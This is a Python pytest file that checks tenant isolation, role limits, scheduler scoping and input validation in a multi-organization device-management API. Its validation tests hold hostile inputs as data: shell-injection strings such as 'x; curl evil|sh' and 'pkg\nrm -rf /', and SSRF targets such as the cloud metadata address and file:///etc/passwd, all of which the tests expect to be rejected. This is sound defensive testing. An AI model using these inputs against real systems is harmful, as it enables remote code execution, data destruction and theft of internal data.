"""Cross-tenant isolation and role checks.

Every test here sets up a second organization (B) next to the default one (A) and
asserts that A's users cannot read, change or trigger anything that belongs to B,
and that viewers cannot perform admin actions. These were all possible before.
"""
import uuid
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest

from app.core.security import create_access_token, hash_password
from app.models.alert import Alert
from app.models.compliance import CompliancePolicy
from app.models.device import Device
from app.models.device_group import DeviceGroup
from app.models.notification_rule import NotificationRule
from app.models.organization import Organization, OrganizationMember
from app.models.scheduled_command import ScheduledCommand
from app.models.user import User
from tests.conftest import DEFAULT_ORG_ID

ORG_B = uuid.UUID("00000000-0000-0000-0000-0000000000b0")


def _token(user: User, org_id: uuid.UUID) -> dict:
    token = create_access_token(
        str(user.id), {"role": user.role, "username": user.username, "org_id": str(org_id)}
    )
    return {"Authorization": f"Bearer {token}"}


def _user(db, name: str, role: str, org_id: uuid.UUID, member_role: str = "member") -> User:
    user = User(
        id=uuid.uuid4(), username=name, password_hash=hash_password("x" * 12), role=role,
        is_active=True, active_org_id=org_id,
    )
    db.add(user)
    db.add(OrganizationMember(id=uuid.uuid4(), org_id=org_id, user_id=user.id, role=member_role))
    return user


def _device(db, host: str, org_id: uuid.UUID) -> Device:
    device = Device(id=uuid.uuid4(), hostname=host, os_type="linux", api_key_hash="h", org_id=org_id)
    db.add(device)
    return device


@pytest.fixture
def world(db_session):
    db = db_session
    admin_b = _user(db, "admin-b", "admin", ORG_B, "owner")
    db.add(Organization(id=ORG_B, name="B", slug="b", owner_id=admin_b.id))
    viewer_a = _user(db, "viewer-a", "viewer", DEFAULT_ORG_ID)
    admin_a = db.items(User)[0]  # seeded admin, member of org A
    device_a = _device(db, "host-a", DEFAULT_ORG_ID)
    device_b = _device(db, "host-b", ORG_B)
    group_b = DeviceGroup(id=uuid.uuid4(), org_id=ORG_B, name="b-group")
    sched_b = ScheduledCommand(
        id=uuid.uuid4(), org_id=ORG_B, device_id=device_b.id, command_type="shell",
        payload={"command": "echo b"}, cron_expression="* * * * *", is_enabled=True,
        next_run_at=datetime.now(timezone.utc), created_by=admin_b.id,
    )
    rule_b = NotificationRule(
        id=uuid.uuid4(), org_id=ORG_B, alert_type="*", severity_min="info", channel="webhook",
        webhook_url="https://b.example.org/hook", is_enabled=True,
    )
    policy_b = CompliancePolicy(id=uuid.uuid4(), org_id=ORG_B, name="b-policy", rules=[], is_active=True)
    for obj in (group_b, sched_b, rule_b, policy_b):
        db.add(obj)
    return SimpleNamespace(
        admin_a=admin_a, viewer_a=viewer_a, admin_b=admin_b, device_a=device_a, device_b=device_b,
        group_b=group_b, sched_b=sched_b, rule_b=rule_b, policy_b=policy_b,
        h_admin_a=_token(admin_a, DEFAULT_ORG_ID), h_viewer_a=_token(viewer_a, DEFAULT_ORG_ID),
        h_admin_b=_token(admin_b, ORG_B),
    )


# --- SRV-01: the scheduler must stay inside the schedule's organization ---------------

@pytest.mark.asyncio
async def test_untargeted_scheduled_command_only_runs_on_its_own_org(world, db_session, monkeypatch):
    from app.tasks import scheduler_tasks

    world.sched_b.device_id = None  # "all devices" schedule belonging to org B
    dispatched: list[uuid.UUID] = []

    async def fake_dispatch(self, device_id, command_type, payload, issued_by, **kw):
        dispatched.append(getattr(device_id, "id", device_id))
        return SimpleNamespace(id=uuid.uuid4()), True

    class Ctx:
        async def __aenter__(self):
            return db_session

        async def __aexit__(self, *exc):
            return False

    monkeypatch.setattr(scheduler_tasks, "AsyncSessionLocal", lambda: Ctx())
    monkeypatch.setattr(scheduler_tasks.CommandService, "dispatch_command", fake_dispatch)

    await scheduler_tasks._run_scheduled_commands()

    assert world.device_b.id in dispatched
    assert world.device_a.id not in dispatched, "org B's schedule ran on org A's device"


@pytest.mark.asyncio
async def test_existing_schedule_pointing_at_another_orgs_device_is_blocked_and_disabled(world, db_session, monkeypatch):
    """Rows created before org checks existed must not keep running on foreign devices."""
    from app.tasks import scheduler_tasks

    legacy = ScheduledCommand(
        id=uuid.uuid4(), org_id=ORG_B, device_id=world.device_a.id, command_type="shell",
        payload={"command": "id"}, cron_expression="* * * * *", is_enabled=True,
        next_run_at=datetime.now(timezone.utc), created_by=world.admin_b.id,
    )
    db_session.add(legacy)
    world.sched_b.is_enabled = False  # keep org B's own schedule out of this test
    dispatched: list = []

    async def fake_dispatch(self, device_id, command_type, payload, issued_by, **kw):
        dispatched.append(device_id)
        return SimpleNamespace(id=uuid.uuid4()), True

    class Ctx:
        async def __aenter__(self):
            return db_session

        async def __aexit__(self, *exc):
            return False

    monkeypatch.setattr(scheduler_tasks, "AsyncSessionLocal", lambda: Ctx())
    monkeypatch.setattr(scheduler_tasks.CommandService, "dispatch_command", fake_dispatch)

    await scheduler_tasks._run_scheduled_commands()

    assert dispatched == []
    assert legacy.is_enabled is False and legacy.next_run_at is None


# --- SRV-02: scheduled commands API --------------------------------------------------

@pytest.mark.asyncio
async def test_cannot_schedule_a_command_on_another_orgs_device(client, world):
    response = await client.post(
        "/api/v1/scheduled-commands", headers=world.h_admin_a,
        json={"device_id": str(world.device_b.id), "command_type": "shell",
              "payload": {"command": "id"}, "cron_expression": "* * * * *"},
    )
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_cannot_modify_or_delete_another_orgs_schedule(client, world):
    url = f"/api/v1/scheduled-commands/{world.sched_b.id}"
    patch = await client.patch(url, headers=world.h_admin_a, json={"is_enabled": False})
    delete = await client.delete(url, headers=world.h_admin_a)
    assert patch.status_code == 404 and delete.status_code == 404
    assert world.sched_b.is_enabled is True


@pytest.mark.asyncio
async def test_scheduled_command_validation(client, world):
    base = {"device_id": str(world.device_a.id), "command_type": "shell", "payload": {"command": "id"}}
    bad_cron = await client.post("/api/v1/scheduled-commands", headers=world.h_admin_a,
                                 json={**base, "cron_expression": "not a cron"})
    bad_type = await client.post("/api/v1/scheduled-commands", headers=world.h_admin_a,
                                 json={**base, "command_type": "format_disk", "cron_expression": "* * * * *"})
    ok = await client.post("/api/v1/scheduled-commands", headers=world.h_admin_a,
                           json={**base, "cron_expression": "*/5 * * * *"})
    assert bad_cron.status_code == 422 and bad_type.status_code == 422
    assert ok.status_code == 200


@pytest.mark.asyncio
async def test_unknown_schedule_is_404_not_200(client, world):
    response = await client.delete(f"/api/v1/scheduled-commands/{uuid.uuid4()}", headers=world.h_admin_a)
    assert response.status_code == 404


# --- SRV-03: software update dispatch ------------------------------------------------

@pytest.mark.asyncio
async def test_viewer_cannot_dispatch_software_updates(client, world):
    response = await client.post(
        "/api/v1/software-updates/dispatch", headers=world.h_viewer_a,
        json={"software_names": ["vim"], "device_ids": [str(world.device_a.id)]},
    )
    assert response.status_code == 403


@pytest.mark.asyncio
async def test_software_dispatch_rejects_shell_metacharacters(client, world):
    for evil in ("x; curl evil|sh", "$(id)", "a b", "`id`", "x&&y", "pkg\nrm -rf /"):
        response = await client.post(
            "/api/v1/software-updates/dispatch", headers=world.h_admin_a,
            json={"software_names": [evil], "device_ids": [str(world.device_a.id)]},
        )
        assert response.status_code == 422, evil


@pytest.mark.asyncio
async def test_software_dispatch_valid_names_are_audited_and_capped(client, world, db_session, monkeypatch):
    from app.models.audit_log import AuditLog
    from app.services import command_service as module

    async def fake_send(device_id, message):
        return True

    monkeypatch.setattr(module.manager, "send_to_device", fake_send)
    ok = await client.post(
        "/api/v1/software-updates/dispatch", headers=world.h_admin_a,
        json={"software_names": ["openssl", "libc6", "nginx-core_1.2+b1:amd64"], "device_ids": [str(world.device_a.id)]},
    )
    assert ok.status_code == 200 and len(ok.json()["dispatched"]) == 1
    assert any(a.action == "software_update_dispatched" for a in db_session.items(AuditLog))

    too_many = await client.post(
        "/api/v1/software-updates/dispatch", headers=world.h_admin_a,
        json={"software_names": [f"pkg{i}" for i in range(101)], "device_ids": [str(world.device_a.id)]},
    )
    assert too_many.status_code == 422


# --- SRV-04 / SRV-11: notification rules ---------------------------------------------

@pytest.mark.asyncio
async def test_alerts_only_notify_their_own_orgs_rules(world, db_session, monkeypatch):
    from app.services import notification_service as module

    rule_a = NotificationRule(
        id=uuid.uuid4(), org_id=DEFAULT_ORG_ID, alert_type="*", severity_min="info", channel="webhook",
        webhook_url="https://a.example.org/hook", is_enabled=True,
    )
    db_session.add(rule_a)
    urls: list[str] = []
    monkeypatch.setattr(module.deliver_webhook_notification, "delay", lambda url, payload: urls.append(url))

    alert = Alert(id=uuid.uuid4(), device_id=world.device_a.id, alert_type="high_cpu", severity="critical",
                  message="m", is_resolved=False, created_at=datetime.now(timezone.utc))
    await module.NotificationService(db_session).notify(alert, world.device_a)

    assert urls == ["https://a.example.org/hook"], "org A's alert leaked to org B's webhook"


@pytest.mark.asyncio
async def test_cannot_edit_or_delete_another_orgs_notification_rule(client, world):
    url = f"/api/v1/notification-rules/{world.rule_b.id}"
    patch = await client.patch(url, headers=world.h_admin_a, json={"webhook_url": "https://93.184.216.34/hook"})
    delete = await client.delete(url, headers=world.h_admin_a)
    assert patch.status_code == 404 and delete.status_code == 404
    assert world.rule_b.webhook_url == "https://b.example.org/hook"


@pytest.mark.asyncio
async def test_notification_rule_can_be_deleted_by_its_org(client, world, db_session):
    created = await client.post("/api/v1/notification-rules", headers=world.h_admin_a,
                                json={"channel": "browser"})
    rule_id = created.json()["id"]
    deleted = await client.delete(f"/api/v1/notification-rules/{rule_id}", headers=world.h_admin_a)
    assert deleted.status_code == 200
    assert all(str(r.id) != rule_id for r in db_session.items(NotificationRule))


@pytest.mark.asyncio
@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data", "http://127.0.0.1:6379", "http://localhost/hook",
    "http://10.0.0.5/x", "http://192.168.1.1/x", "http://[::1]/x", "ftp://example.org/x", "file:///etc/passwd",
])
async def test_webhook_url_rejects_internal_and_non_http_targets(client, world, url):
    response = await client.post("/api/v1/notification-rules", headers=world.h_admin_a,
                                 json={"channel": "webhook", "webhook_url": url})
    assert response.status_code == 422, url


# --- SRV-05: groups ------------------------------------------------------------------

@pytest.mark.asyncio
async def test_groups_of_another_org_are_invisible_and_immutable(client, world):
    gid = world.group_b.id
    assert (await client.get(f"/api/v1/groups/{gid}/devices", headers=world.h_viewer_a)).status_code == 404
    assert (await client.patch(f"/api/v1/groups/{gid}", headers=world.h_admin_a, json={"name": "x"})).status_code == 404
    assert (await client.delete(f"/api/v1/groups/{gid}", headers=world.h_admin_a)).status_code == 404
    add = await client.post(f"/api/v1/groups/{gid}/devices", headers=world.h_admin_a,
                            json={"device_ids": [str(world.device_a.id)]})
    assert add.status_code == 404
    assert world.group_b.name == "b-group"


@pytest.mark.asyncio
async def test_cannot_put_another_orgs_device_into_my_group(client, world, db_session):
    mine = DeviceGroup(id=uuid.uuid4(), org_id=DEFAULT_ORG_ID, name="mine")
    db_session.add(mine)
    response = await client.post(f"/api/v1/groups/{mine.id}/devices", headers=world.h_admin_a,
                                 json={"device_ids": [str(world.device_b.id)]})
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_device_group_listing_requires_device_in_my_org(client, world):
    response = await client.get(f"/api/v1/groups/device/{world.device_b.id}", headers=world.h_viewer_a)
    assert response.status_code == 404


# --- SRV-06: membership is verified, not just trusted from the token -----------------

@pytest.mark.asyncio
async def test_token_for_an_org_the_user_is_not_a_member_of_is_rejected(client, world):
    forged = _token(world.admin_a, ORG_B)  # org A's admin, org B claim
    response = await client.get("/api/v1/devices", headers=forged)
    assert response.status_code in (401, 403)


@pytest.mark.asyncio
async def test_removed_member_loses_access_immediately(client, world, db_session):
    member = next(m for m in db_session.items(OrganizationMember) if m.user_id == world.viewer_a.id)
    assert (await client.get("/api/v1/devices", headers=world.h_viewer_a)).status_code == 200
    db_session._store[OrganizationMember].remove(member)
    assert (await client.get("/api/v1/devices", headers=world.h_viewer_a)).status_code in (401, 403)


@pytest.mark.asyncio
async def test_removing_a_member_clears_their_active_org(client, world, db_session):
    response = await client.delete(
        f"/api/v1/organizations/{DEFAULT_ORG_ID}/members/{world.viewer_a.id}", headers=world.h_admin_a,
    )
    assert response.status_code == 200
    assert world.viewer_a.active_org_id is None


# --- SRV-07: user administration is per organization ---------------------------------

@pytest.mark.asyncio
async def test_admin_user_list_only_shows_my_orgs_members(client, world):
    response = await client.get("/api/v1/admin/users", headers=world.h_admin_a)
    names = {u["username"] for u in response.json()}
    assert "admin-b" not in names
    assert {"admin", "viewer-a"} <= names


@pytest.mark.asyncio
async def test_admin_cannot_touch_another_orgs_users(client, world):
    uid = world.admin_b.id
    reset = await client.patch(f"/api/v1/admin/users/{uid}/password", headers=world.h_admin_a,
                               json={"password": "takeover-password-1"})
    update = await client.patch(f"/api/v1/admin/users/{uid}", headers=world.h_admin_a, json={"is_active": False})
    delete = await client.delete(f"/api/v1/admin/users/{uid}", headers=world.h_admin_a)
    assert (reset.status_code, update.status_code, delete.status_code) == (404, 404, 404)
    assert world.admin_b.is_active is True


@pytest.mark.asyncio
async def test_created_users_join_the_creators_org_and_can_use_it(client, world, db_session):
    response = await client.post("/api/v1/admin/users", headers=world.h_admin_a,
                                 json={"username": "newbie", "password": "a-long-password-1", "role": "viewer"})
    assert response.status_code == 200
    new = next(u for u in db_session.items(User) if u.username == "newbie")
    assert new.active_org_id == DEFAULT_ORG_ID
    assert any(m.user_id == new.id and m.org_id == DEFAULT_ORG_ID for m in db_session.items(OrganizationMember))


@pytest.mark.asyncio
async def test_enrollment_token_is_issued_for_the_verified_org(client, world, fake_redis):
    response = await client.post("/api/v1/admin/enrollment-tokens", headers=world.h_admin_a)
    token = response.json()["enrollment_token"]
    assert str(DEFAULT_ORG_ID) in await fake_redis.get(f"enrollment:{token}")
    forged = await client.post("/api/v1/admin/enrollment-tokens", headers=_token(world.admin_a, ORG_B))
    assert forged.status_code in (401, 403)


# --- SRV-08: viewers are read-only ---------------------------------------------------

@pytest.mark.asyncio
@pytest.mark.parametrize("command_type", ["reboot", "update", "sync_time", "shell", "script"])
async def test_viewer_cannot_dispatch_disruptive_commands(client, world, command_type):
    response = await client.post(
        f"/api/v1/devices/{world.device_a.id}/commands", headers=world.h_viewer_a,
        json={"command_type": command_type, "payload": {"command": "id"}},
    )
    assert response.status_code == 403


@pytest.mark.asyncio
@pytest.mark.parametrize("command_type", ["diagnostics", "request_process_list", "update_check"])
async def test_viewer_can_still_run_read_only_commands(client, world, command_type, monkeypatch):
    from app.services import command_service as module

    async def fake_send(device_id, message):
        return True

    monkeypatch.setattr(module.manager, "send_to_device", fake_send)
    response = await client.post(
        f"/api/v1/devices/{world.device_a.id}/commands", headers=world.h_viewer_a,
        json={"command_type": command_type, "payload": {}},
    )
    assert response.status_code == 200


@pytest.mark.asyncio
@pytest.mark.parametrize("method, path, body", [
    ("patch", "/api/v1/devices/{d}", {"notes": "x"}),
    ("post", "/api/v1/devices/{d}/maintenance", {"enabled": True}),
    ("post", "/api/v1/devices/{d}/config", {"telemetry_interval_secs": 5}),
    ("post", "/api/v1/devices/{d}/screenshot/request", None),
    ("post", "/api/v1/compliance/policies", {"name": "p", "rules": []}),
    ("post", "/api/v1/compliance/evaluate/{p}", None),
])
async def test_viewer_cannot_mutate(client, world, method, path, body):
    url = path.format(d=world.device_a.id, p=world.policy_b.id)
    response = await getattr(client, method)(url, headers=world.h_viewer_a, **({"json": body} if body is not None else {}))
    assert response.status_code == 403, url


@pytest.mark.asyncio
async def test_viewer_cannot_resolve_alerts(client, world, db_session):
    alert = Alert(id=uuid.uuid4(), device_id=world.device_a.id, alert_type="high_cpu", severity="warning",
                  message="m", is_resolved=False, created_at=datetime.now(timezone.utc))
    db_session.add(alert)
    response = await client.post(f"/api/v1/alerts/{alert.id}/resolve", headers=world.h_viewer_a)
    assert response.status_code == 403


# --- SRV-09: compliance evaluation ---------------------------------------------------

@pytest.mark.asyncio
async def test_compliance_evaluation_runs_against_real_metric_columns(world, db_session):
    from app.models.metrics import DeviceMetric
    from app.services.compliance_service import ComplianceService

    db_session.add(DeviceMetric(device_id=world.device_a.id, disk_percent=40.0, disk_total_gb=100.0, disk_used_gb=40.0))
    policy = CompliancePolicy(id=uuid.uuid4(), org_id=DEFAULT_ORG_ID, name="p", is_active=True,
                              rules=[{"type": "max_disk_percent", "value": 90}])
    result = await ComplianceService(db_session).evaluate_device(world.device_a, policy)
    assert result.is_compliant is True and result.violations == 0
